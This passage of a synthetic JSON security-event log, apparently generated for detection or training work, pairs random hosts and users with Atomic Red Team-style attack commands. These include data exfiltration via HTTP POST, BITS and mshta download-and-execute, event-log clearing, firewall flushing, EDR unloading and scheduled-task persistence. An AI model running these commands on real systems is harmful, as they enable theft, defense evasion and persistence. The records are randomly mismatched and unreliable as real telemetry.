        "SourceProcessID": 8823,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\piece..dll",
        "DestinationProcessID": 3576,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\son..dll",
        "UtcTime": "2024-05-17T01:36:51.798976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-34.ortega.com",
        "User": "thomas34",
        "ProcessID": 4353,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \\\"#{input_file}\\\"\\n\",",
        "LogonID": 273214,
        "LogonGuid": "a315d53d-49fc-4d45-843a-af874efcb508",
        "SourceProcessID": 7602,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\artist..dll",
        "DestinationProcessID": 5082,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\time..dll",
        "UtcTime": "2024-05-17T01:36:51.798976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-19.harper.com",
        "User": "linda88",
        "ProcessID": 5065,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"bitsadmin.exe /create #{bits_job_name}\\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\\nbitsadmin.exe /resume #{bits_job_name}\\nping -n 5 127.0.0.1 >nul 2>&1\\nbitsadmin.exe /complete #{bits_job_name}\\n\",",
        "LogonID": 237207,
        "LogonGuid": "ce17cce0-4293-4365-84fa-95d7759d0039",
        "SourceProcessID": 5313,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\probably..dll",
        "DestinationProcessID": 1188,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\work..dll",
        "UtcTime": "2024-05-17T01:36:51.798976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-28.chavez-smith.info",
        "User": "christopherross",
        "ProcessID": 2905,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"for %i in (C$ IPC$ ADMIN$) do net share %i /delete\",",
        "LogonID": 570557,
        "LogonGuid": "de5eeffc-09e2-474c-abe9-c5ddf0c1ad92",
        "SourceProcessID": 3129,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\player..exe",
        "DestinationProcessID": 1846,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\stand..exe",
        "UtcTime": "2024-05-17T01:36:51.798976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-66.medina.net",
        "User": "wisedenise",
        "ProcessID": 5090,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wevtutil cl #{log_name}\\n\",",
        "LogonID": 906121,
        "LogonGuid": "d39e4b9a-8e30-49a7-b5ca-c05404304104",
        "SourceProcessID": 7386,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\attention..exe",
        "DestinationProcessID": 8337,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\leave..dll",
        "UtcTime": "2024-05-17T01:36:51.798976Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-82.garza-ramirez.com",
        "User": "thomasmurphy",
        "ProcessID": 1289,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sudo defaults read /Library/Preferences/com.apple.alf\\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\\n\",",
        "LogonID": 231664,
        "LogonGuid": "9921a852-123b-4dbc-b8b5-8960cf122e1c",
        "SourceProcessID": 9163,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\security..dll",
        "DestinationProcessID": 2039,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\over..exe",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-17.carpenter.org",
        "User": "foxcorey",
        "ProcessID": 6344,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo sysadminctl -guestAccount on\",",
        "LogonID": 645196,
        "LogonGuid": "4c94e16f-fab6-44c8-a988-12d677d25ca2",
        "SourceProcessID": 1014,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\music..dll",
        "DestinationProcessID": 4747,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\political..exe",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-61.shannon.com",
        "User": "smithchristopher",
        "ProcessID": 5595,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo \\\"# THIS IS A COMMENT\\\" >> /etc/ufw/ufw.conf\\ngrep \\\"# THIS IS A COMMENT\\\" /etc/ufw/ufw.conf\\n\",",
        "LogonID": 799951,
        "LogonGuid": "47cef543-a7a6-49ea-8cf0-6d8f1e1e0798",
        "SourceProcessID": 9970,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\campaign..dll",
        "DestinationProcessID": 6850,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\agreement..exe",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-20.bradley.com",
        "User": "matthew94",
        "ProcessID": 5008,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$var =Invoke-WebRequest \\\"#{hta_url}\\\"\\n$var.content|out-file \\\"#{temp_file}\\\"\\nmshta \\\"#{temp_file}\\\"\\nstart-sleep -s 15\\nstop-process -name \\\"calculator\\\" -Force\\n\",",
        "LogonID": 436160,
        "LogonGuid": "d19e203c-9c6f-4c5c-b001-6c9ba6201e18",
        "SourceProcessID": 6610,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\key..exe",
        "DestinationProcessID": 3271,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\drive..exe",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-85.kerr.info",
        "User": "kennethkim",
        "ProcessID": 6077,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\",",
        "LogonID": 338594,
        "LogonGuid": "2db3612b-75af-4366-94d6-b40cf92a7273",
        "SourceProcessID": 4655,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\short..dll",
        "DestinationProcessID": 8892,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\sister..dll",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-58.franklin-bishop.net",
        "User": "rayvincent",
        "ProcessID": 3982,
        "ProcessName": "malware.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\build\\\\namedpipes_executor.exe\\\" --pipe 2\\n\",",
        "LogonID": 857237,
        "LogonGuid": "c3787ffc-6520-41fd-b4c3-808675640117",
        "SourceProcessID": 9475,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\develop..dll",
        "DestinationProcessID": 2460,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\indeed..exe",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-36.mora.com",
        "User": "armstrongsuzanne",
        "ProcessID": 6833,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[ \\\"$(uname)\\\" = 'FreeBSD' ] && cmd=\\\"lastlogin\\\" || cmd=\\\"lastlog\\\" \\n$cmd > #{output_file}\\ncat #{output_file}\\n\",",
        "LogonID": 380315,
        "LogonGuid": "155538ca-12f2-4f56-852c-f979b48d8e89",
        "SourceProcessID": 9535,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\your..dll",
        "DestinationProcessID": 7814,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\sign..dll",
        "UtcTime": "2024-05-17T01:36:51.799977Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-92.martinez-russo.info",
        "User": "dianawaller",
        "ProcessID": 3952,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\\nEnable-TransportAgent #{transport_agent_identity}\\nGet-TransportAgent | Format-List Name,Enabled\\n\",",
        "LogonID": 617457,
        "LogonGuid": "04dd3fb6-4dfe-42c5-b469-49873343a653",
        "SourceProcessID": 6342,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\us..exe",
        "DestinationProcessID": 1911,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\face..exe",
        "UtcTime": "2024-05-17T01:36:51.801484Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-13.patterson.info",
        "User": "caleb92",
        "ProcessID": 4138,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"iptables-save > /tmp/iptables.rules\\niptables -F\\n\",",
        "LogonID": 691851,
        "LogonGuid": "7a9cddd4-9f75-474b-90d4-5128d752ab47",
        "SourceProcessID": 7023,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\call..dll",
        "DestinationProcessID": 6498,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\guy..exe",
        "UtcTime": "2024-05-17T01:36:51.801484Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-82.hancock.com",
        "User": "henrynichole",
        "ProcessID": 1593,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo launchctl unload #{falcond_plist}\\nsudo launchctl unload #{userdaemon_plist}\\n\",",
        "LogonID": 211104,
        "LogonGuid": "3fb10887-3dd0-4b78-976f-a93d2dd4c973",
        "SourceProcessID": 3603,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\forward..exe",
        "DestinationProcessID": 4479,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\tonight..dll",
        "UtcTime": "2024-05-17T01:36:51.801484Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-49.foster-mills.org",
        "User": "sandra83",
        "ProcessID": 5033,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"bash -c 'trap \\\"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\\\" EXIT'\\n\",",
        "LogonID": 645634,
        "LogonGuid": "8c26b321-fd16-4fc4-8706-fc3d16da24f2",
        "SourceProcessID": 2346,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\white..dll",
        "DestinationProcessID": 9058,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\establish..dll",
        "UtcTime": "2024-05-17T01:36:51.801484Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-97.adams.com",
        "User": "jillmathis",
        "ProcessID": 3364,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"icacls \\\"#{path}\\\" /grant Everyone:F /T /C /Q\",",
        "LogonID": 812008,
        "LogonGuid": "22f313cc-1918-4647-bcec-287a6bf5fc2e",
        "SourceProcessID": 9664,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\exactly..exe",
        "DestinationProcessID": 7620,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\pass..exe",
        "UtcTime": "2024-05-17T01:36:51.801484Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-08.khan-rangel.biz",
        "User": "harrisjeffrey",
        "ProcessID": 1982,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Unblock-File -Path #{file_path}\\n\",",
        "LogonID": 376249,
        "LogonGuid": "0ad4e6cc-3f32-48f2-bd6c-bb23455ee267",
        "SourceProcessID": 5438,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\save..dll",
        "DestinationProcessID": 1239,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\personal..dll",
        "UtcTime": "2024-05-17T01:36:51.802493Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-88.richardson-rodriguez.biz",
        "User": "jennifer61",
        "ProcessID": 4354,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\\nnetsh advfirewall firewall add rule name=\\\"RDPPORTLatest-TCP-In\\\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\\n\",",
        "LogonID": 813929,
        "LogonGuid": "f25f8e0d-2c5b-46e9-b860-4fb55635a17b",
        "SourceProcessID": 6615,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\reality..exe",
        "DestinationProcessID": 3256,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\among..dll",
        "UtcTime": "2024-05-17T01:36:51.802493Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-15.torres-thompson.com",
        "User": "msingh",
        "ProcessID": 8215,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"apt install xclip -y\\nhistory | tail -n 30 | xclip -sel clip\\nxclip -o > history.txt\\n\",",
        "LogonID": 175355,
        "LogonGuid": "6f958a5a-fd71-4dd8-8475-a7b8074d11c2",
        "SourceProcessID": 5843,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\outside..dll",
        "DestinationProcessID": 4866,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\should..exe",
        "UtcTime": "2024-05-17T01:36:51.802493Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-05.davis.com",
        "User": "vpeterson",
        "ProcessID": 9072,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"ntdsutil \\\"set dsrm password\\\" \\\"sync from domain account #{sync_account}\\\" \\\"q\\\" \\\"q\\\"\\n\",",
        "LogonID": 490149,
        "LogonGuid": "3b8dc92b-cc5b-498e-a870-b173112869c8",
        "SourceProcessID": 8512,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\analysis..dll",
        "DestinationProcessID": 4588,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\whose..exe",
        "UtcTime": "2024-05-17T01:36:51.802493Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-64.parsons.com",
        "User": "jimenezanna",
        "ProcessID": 9427,
        "ProcessName": "malware.exe",
        "CommandLine": "\"schtasks /create /tn \\\"T1053_005_OnLogon\\\" /sc onlogon /tr \\\"cmd.exe /c calc.exe\\\"\\nschtasks /create /tn \\\"T1053_005_OnStartup\\\" /sc onstart /ru system /tr \\\"cmd.exe /c calc.exe\\\"\\n\",",
        "LogonID": 444620,
        "LogonGuid": "610b35e2-bcb5-4723-b799-9dfadb47cb7e",
        "SourceProcessID": 2865,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\Mr..exe",
        "DestinationProcessID": 1867,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\continue..dll",
        "UtcTime": "2024-05-17T01:36:51.803491Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-97.warner-schultz.net",
        "User": "awashington",
        "ProcessID": 9139,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"REG QUERY HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography /v MachineGuid\\n\",",
        "LogonID": 402673,
        "LogonGuid": "a20d2648-0887-4265-a2a5-b15384d7dcbf",
        "SourceProcessID": 2593,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\local..dll",
        "DestinationProcessID": 6479,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\look..exe",
        "UtcTime": "2024-05-17T01:36:51.803491Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-44.schwartz-chandler.com",
        "User": "stephanieyoung",
        "ProcessID": 5495,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo \\\"#{message}\\\" > \\\"#{file_contents_path}\\\" & type \\\"#{file_contents_path}\\\"\\n\",",
        "LogonID": 972870,
        "LogonGuid": "9f912193-a8a6-48e8-b300-e4088b096a40",
        "SourceProcessID": 3414,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\mother..exe",
        "DestinationProcessID": 3013,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\little..dll",
        "UtcTime": "2024-05-17T01:36:51.803491Z"
    },
